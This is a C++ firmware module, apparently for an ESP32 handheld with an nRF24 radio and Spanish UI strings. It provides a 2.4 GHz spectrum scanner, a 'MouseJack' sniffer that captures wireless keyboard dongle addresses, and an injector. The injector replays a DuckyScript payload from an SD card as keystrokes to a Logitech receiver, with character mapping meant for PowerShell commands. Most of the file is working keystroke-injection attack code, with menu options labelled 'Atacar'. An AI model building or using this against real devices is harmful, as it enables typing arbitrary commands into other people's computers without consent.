#include "nrf_module.h"

// Instancia global de la radio
RF24 radio(NRF_CE_PIN, NRF_CSN_PIN);

// Constantes para el escáner de espectro
const uint8_t num_channels = 128;
uint8_t values[num_channels];

bool setupNRF() {
    if (!radio.begin()) {
        return false; 
    }
    radio.setAutoAck(false);
    radio.startListening();
    radio.stopListening();
    return true;
}

// --- DICCIONARIO HID EXTENDIDO (Soporta caracteres especiales para PowerShell) ---
void charToHID(char c, uint8_t &mod, uint8_t &key) {
    mod = 0x00;
    if (c >= 'a' && c <= 'z') { key = c - 'a' + 0x04; }
    else if (c >= 'A' && c <= 'Z') { key = c - 'A' + 0x04; mod = 0x02; }
    else if (c >= '1' && c <= '9') { key = c - '1' + 0x1E; }
    else if (c == '0') { key = 0x27; }
    else if (c == ' ') { key = 0x2C; }
    else if (c == '-') { key = 0x2D; }
    else if (c == '_') { key = 0x2D; mod = 0x02; }
    else if (c == '=') { key = 0x2E; }
    else if (c == '+') { key = 0x2E; mod = 0x02; }
    else if (c == '[') { key = 0x2F; }
    else if (c == ']') { key = 0x30; }
    else if (c == '{') { key = 0x2F; mod = 0x02; }
    else if (c == '}') { key = 0x30; mod = 0x02; }
    else if (c == '\\') { key = 0x31; }
    else if (c == '|') { key = 0x31; mod = 0x02; }
    else if (c == ';') { key = 0x33; }
    else if (c == ':') { key = 0x33; mod = 0x02; }
    else if (c == '\'') { key = 0x34; }
    else if (c == '"') { key = 0x34; mod = 0x02; }
    else if (c == ',') { key = 0x36; }
    else if (c == '<') { key = 0x36; mod = 0x02; }
    else if (c == '.') { key = 0x37; }
    else if (c == '>') { key = 0x37; mod = 0x02; }
    else if (c == '/') { key = 0x38; }
    else if (c == '?') { key = 0x38; mod = 0x02; }
    else if (c == '!') { key = 0x1E; mod = 0x02; }
    else if (c == '@') { key = 0x1F; mod = 0x02; }
    else if (c == '#') { key = 0x20; mod = 0x02; }
    else if (c == '$') { key = 0x21; mod = 0x02; }
    else if (c == '%') { key = 0x22; mod = 0x02; }
    else if (c == '^') { key = 0x23; mod = 0x02; }
    else if (c == '&') { key = 0x24; mod = 0x02; }
    else if (c == '*') { key = 0x25; mod = 0x02; }
    else if (c == '(') { key = 0x26; mod = 0x02; }
    else if (c == ')') { key = 0x27; mod = 0x02; }
    else { key = 0x00; } 
}

void enviarTeclaLogitech(uint64_t target_mac, uint8_t modificador, uint8_t tecla) {
    uint8_t payload[10] = {0x0F, 0x00, modificador, tecla, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    radio.write(&payload, sizeof(payload));
    delay(12); 
    
    uint8_t soltar[10] = {0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    radio.write(&soltar, sizeof(soltar));
    delay(12);
}

// --- EL CEREBRO DEL TRADUCTOR DUCKYSCRIPT ---
void ejecutarDuckyScript(const char* filepath, uint64_t target_mac) {
    File file = SD.open(filepath);
    if (!file) {
        u8g2.clearBuffer();
        u8g2.drawStr(0, 30, "Error SD:");
        u8g2.drawStr(0, 45, "Falta payload.txt");
        u8g2.sendBuffer();
        delay(3000);
        return;
    }

    while (file.available()) {
        String line = file.readStringUntil('\n');
        line.trim(); 

        if (line.length() == 0 || line.startsWith("REM")) {
            continue; 
        }
        
        if (line.startsWith("DELAY ")) {
            int ms = line.substring(6).toInt();
            delay(ms);
        }
        else if (line.startsWith("STRING ")) {
            String text = line.substring(7);
            for (int i = 0; i < text.length(); i++) {
                uint8_t mod, key;
                charToHID(text[i], mod, key);
                if (key != 0x00) {
                    enviarTeclaLogitech(target_mac, mod, key);
                }
            }
        }
        else if (line == "ENTER") {
            enviarTeclaLogitech(target_mac, 0x00, 0x28);
        }
        else if (line.startsWith("GUI ")) {
            char targetKey = line.charAt(4);
            uint8_t mod, key;
            charToHID(targetKey, mod, key);
            enviarTeclaLogitech(target_mac, 0x08, key); 
        }
        else if (line == "TAB") {
            enviarTeclaLogitech(target_mac, 0x00, 0x2B);
        }
    }
    file.close();
}

void inyectarPayloadLogitech(uint8_t* mac_addr) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.drawStr(0, 20, ">> INYECTANDO <<");
    u8g2.drawStr(0, 40, "Leyendo SD...");
    u8g2.sendBuffer();

    radio.stopListening();
    radio.setAutoAck(false);
    
    uint64_t target_mac;
    memcpy(&target_mac, mac_addr, 5);
    radio.openWritingPipe(target_mac);
    
    // Ejecutar el script desde la SD
    ejecutarDuckyScript("/payload.txt", target_mac);

    u8g2.clearBuffer();
    u8g2.drawStr(0, 30, "Ataque Terminado!");
    u8g2.sendBuffer();
    delay(2000);
    
    radio.startListening();
}

void iniciarEscanerNRF() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.drawStr(10, 30, "Iniciando NRF24...");
    u8g2.sendBuffer();
    
    if (!setupNRF()) {
        u8g2.clearBuffer();
        u8g2.drawStr(10, 30, "Error NRF24!");
        u8g2.drawStr(10, 45, "Revisa cables");
        u8g2.sendBuffer();
        delay(3000);
        return; 
    }

    for (int i = 0; i < num_channels; i++) values[i] = 0;

    bool escaneando = true;
    while (escaneando) {
        for (int i = 0; i < num_channels; i++) {
            radio.setChannel(i);
            radio.startListening();
            delayMicroseconds(128); 
            radio.stopListening();
            
            if (radio.testCarrier()) {
                values[i]++;
            }
        }

        u8g2.clearBuffer();
        for (int i = 0; i < 128; i++) { 
            if (values[i] > 0) {
                int altura = min(values[i], (uint8_t)64); 
                u8g2.drawLine(i, 64, i, 64 - altura); 
            }
        }
        
        u8g2.setFont(u8g2_font_4x6_tr);
        u8g2.drawStr(0, 6, "2.4GHz Scanner (Click p/salir)");
        u8g2.sendBuffer();

        for (int i = 0; i < num_channels; i++) {
            if (values[i] > 0) values[i]--;
        }

        if (digitalRead(32) == LOW) {
            delay(200); 
            escaneando = false;
        }
    }
}

void escanerMouseJack() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.drawStr(10, 20, "Sniffer MouseJack");
    u8g2.drawStr(10, 40, "Iniciando...");
    u8g2.sendBuffer();

    if (!setupNRF()) {
        u8g2.clearBuffer(); 
        u8g2.drawStr(10, 30, "Error NRF24!"); 
        u8g2.sendBuffer();
        delay(2000); 
        return;
    }

    radio.setAutoAck(false);           
    radio.setPALevel(RF24_PA_MAX);     
    radio.setDataRate(RF24_2MBPS);     
    radio.setPayloadSize(32);          
    radio.disableCRC();                
    
    const uint64_t promiscuous_addr = 0x0000000000LL; 
    radio.openReadingPipe(0, promiscuous_addr);
    radio.startListening();

    bool escaneando = true;
    int canalActual = 0;
    uint8_t payload[32];

    u8g2.clearBuffer();
    u8g2.drawStr(0, 15, "[ Buscando Targets ]");
    u8g2.sendBuffer();

    while (escaneando) {
        canalActual = (canalActual + 1) % 85; 
        radio.setChannel(canalActual);
        delayMicroseconds(200); 

        if (radio.available()) {
            radio.read(&payload, sizeof(payload));
            
            if (payload[0] != 0x00 && payload[0] != 0xFF) { 
                
                uint8_t mac_capturada[5] = {payload[0], payload[1], payload[2], payload[3], payload[4]};

                u8g2.clearBuffer();
                u8g2.setFont(u8g2_font_ncenB08_tr);
                u8g2.drawStr(0, 15, "!! TARGET ENCONTRADO !!");
                
                char hexStr[20];
                sprintf(hexStr, "%02X:%02X:%02X:%02X", mac_capturada[0], mac_capturada[1], mac_capturada[2], mac_capturada[3]);
                u8g2.drawStr(0, 27, hexStr);
                
                // NOTA: Actualizamos el texto para dejar claro que lee la SD
                u8g2.setFont(u8g2_font_4x6_tr);
                u8g2.drawStr(0, 40, "CLICK = Atacar (SD)");
                u8g2.drawStr(0, 50, "ARRIBA = Ignorar");
                u8g2.drawStr(0, 60, "ABAJO = Salir"); 
                u8g2.sendBuffer();
                
                bool decisionTomada = false;
                while(!decisionTomada) {
                    if (digitalRead(32) == LOW) { // ATACAR
                        delay(200);
                        inyectarPayloadLogitech(mac_capturada);
                        decisionTomada = true;
                    }
                    else if (analogRead(35) < 1000) { // IGNORAR
                        delay(200);
                        decisionTomada = true;
                    }
                    else if (analogRead(35) > 3000) { // SALIR
                        delay(200);
                        decisionTomada = true;
                        escaneando = false; // Esto rompe el escaneo general y te regresa al menú
                    }
                }
                
                if (escaneando) {
                    u8g2.clearBuffer();
                    u8g2.setFont(u8g2_font_ncenB08_tr);
                    u8g2.drawStr(0, 15, "[ Buscando Targets ]");
                    u8g2.sendBuffer();
                }
                
                radio.flush_rx();
            }
        }

        if (digitalRead(32) == LOW) {
            delay(200);
            escaneando = false;
        }
    }
}

void flujoNRF(bool &dentroDeOpcion) {
    int subIndice = 0;
    bool enSubMenu = true;
    const int NUM_SUB_ITEMS = 3;
    String subMenuItems[] = {"1. Escaner 2.4GHz", "2. Atacar MouseJack", "3. Regresar"};

    delay(300); 

    while (enSubMenu) {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_ncenB08_tr);
        u8g2.drawStr(10, 12, "-- Menu NRF24 --");
        
        for (int i = 0; i < NUM_SUB_ITEMS; i++) {
            if (i == subIndice) {
                u8g2.drawStr(0, 30 + (i * 15), ">");
            }
            u8g2.setCursor(12, 30 + (i * 15));
            u8g2.print(subMenuItems[i]);
        }
        u8g2.sendBuffer();

        int valorY = analogRead(35); 
        
        if (valorY < 1000) { 
            subIndice--;
            if (subIndice < 0) subIndice = NUM_SUB_ITEMS - 1;
            delay(200); 
        } 
        else if (valorY > 3000) { 
            subIndice++;
            if (subIndice >= NUM_SUB_ITEMS) subIndice = 0;
            delay(200);
        }

        if (digitalRead(32) == LOW) {
            delay(200); 
            
            if (subIndice == 0) iniciarEscanerNRF();
            else if (subIndice == 1) escanerMouseJack();
            else if (subIndice == 2) enSubMenu = false; 
        }
    }
    
    dentroDeOpcion = false; 
    delay(200);
}